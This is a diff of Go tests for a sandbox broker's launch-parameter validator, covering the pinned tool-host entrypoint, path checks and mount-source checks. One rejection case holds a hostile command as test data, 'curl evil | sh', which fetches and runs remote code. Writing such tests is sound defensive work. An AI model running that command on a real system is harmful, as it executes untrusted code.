@@ -91,9 +91,8 @@ func validParams() LaunchParams {
 			{Key: "GIT_CONFIG_KEY_0", Value: "core.hooksPath"},
 			{Key: "GIT_CONFIG_VALUE_0", Value: "/hooks"},
 		},
-		Args:     []string{sandboxNodeBinary, sandboxWrapperEntry, "-p", "hi"},
+		Args:     []string{TrustedToolHostBinaryDestination, toolHostServeVerb, "--connect", "/run/tf-tools/tools.sock"},
 		Worktree: RunTreeRoot("run-abc123"),
-		SDKDir:   "/opt/tf/sdk",
 		Rlimits:  []Rlimit{{Type: "RLIMIT_NOFILE", Soft: 1024, Hard: 1024}},
 		// The netns name must be the one this run's id derives — the ownership
 		// check binds it, not just the tf-<hex>-<idx> shape.
@@ -175,14 +174,14 @@ func TestValidateLaunchParams_RejectsNonAllowlistedEnvKey(t *testing.T) {
 }
 
 // TestValidateLaunchParams_RejectsNonPinnedEntrypoint pins that the broker
-// owns the command: argv whose first two elements aren't the fixed
-// node+wrapper entrypoint is rejected, so a compromised orchestrator can
-// vary arguments but never the executed program.
+// owns the command: argv whose first two elements aren't the fixed tool-host
+// entrypoint is rejected, so a compromised orchestrator can vary arguments
+// but never the executed program.
 func TestValidateLaunchParams_RejectsNonPinnedEntrypoint(t *testing.T) {
 	for _, argv := range [][]string{
 		{"/bin/sh", "-c", "curl evil | sh"},
-		{sandboxNodeBinary, "/tmp/evil.js"},
-		{sandboxWrapperEntry},
+		{TrustedToolHostBinaryDestination, "bad-verb"},
+		{toolHostServeVerb},
 		nil,
 	} {
 		p := validParams()
@@ -242,9 +241,7 @@ func TestValidateLaunchParams_RejectsBadRlimit(t *testing.T) {
 
 // TestValidateLaunchParams_RejectsNonAbsolutePaths pins that the run-data
 // paths the broker binds (worktree, mount source/destination) must be clean
-// absolute paths — caught at the boundary, not late inside runsc. (SDKDir is
-// not checked here: the broker overrides it with TrustedSDKDir(), so the
-// orchestrator's value is discarded rather than validated.)
+// absolute paths — caught at the boundary, not late inside runsc.
 func TestValidateLaunchParams_RejectsNonAbsolutePaths(t *testing.T) {
 	worktree := validParams()
 	worktree.Worktree = "relative/worktree"
@@ -449,7 +446,7 @@ func TestValidateLaunchParams_RejectsWorktreeOutsideOrgTree(t *testing.T) {
 // case (b): a caller-supplied source for the TF-binary / git-hooks
 // destinations that does not match the broker's own resolution is
 // rejected — these two destinations are broker-resolved, never
-// caller-trusted, mirroring TrustedSDKDir.
+// caller-trusted, mirroring TrustedGitHooksDir.
 func TestValidateLaunchParams_RejectsForeignGlobalMountSource(t *testing.T) {
 	attackerWrapper := filepath.Join(t.TempDir(), "attacker-wrapper")
 	if err := os.WriteFile(attackerWrapper, []byte("evil"), 0o644); err != nil {
